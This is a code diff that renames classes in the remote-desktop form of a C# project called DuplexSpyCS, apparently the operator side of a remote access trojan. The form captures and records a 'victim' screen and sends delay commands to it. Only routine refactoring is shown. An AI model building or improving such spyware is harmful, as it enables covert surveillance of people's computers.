@@ -14,7 +14,7 @@ namespace DuplexSpyCS
 {
     public partial class frmDesktop : Form
     {
-        private static IniManager ini_manager = C2.ini_manager;
+        private static clsIniManager ini_manager = clsStore.ini_manager;
 
         private struct DesktopConfig
         {
@@ -26,13 +26,13 @@ namespace DuplexSpyCS
             public int DisplayQuality;
         }
 
-        public Victim v;
+        public clsVictim v;
         private Dictionary<string, Dictionary<string, int>> monitor_info = new Dictionary<string, Dictionary<string, int>>();
         private Label fps_label = new Label();
         private bool capture = false;
 
         //RECORD
-        private ImageWriter imgWriter;
+        private clsImageWriter imgWriter;
         private int mp4FrameRate = 30;
         private bool isProcessing = false;
 
@@ -82,7 +82,7 @@ namespace DuplexSpyCS
                     {
                         v.dir_victim,
                         "Monitor",
-                        C1.GenerateFileName("mp4"),
+                        clsTools.GenerateFileName("mp4"),
                     });
 
                     //INIT VIDEO WRITER
@@ -556,7 +556,7 @@ namespace DuplexSpyCS
 
         private void toolStripComboBox2_SelectedIndexChanged(object sender, EventArgs e)
         {
-            if (isProcessing && C1.IsPositiveNumber(toolStripComboBox2.Text))
+            if (isProcessing && clsTools.IsPositiveNumber(toolStripComboBox2.Text))
             {
                 v.SendCommand($"desktop|delay|{toolStripComboBox2.Text}");
             }
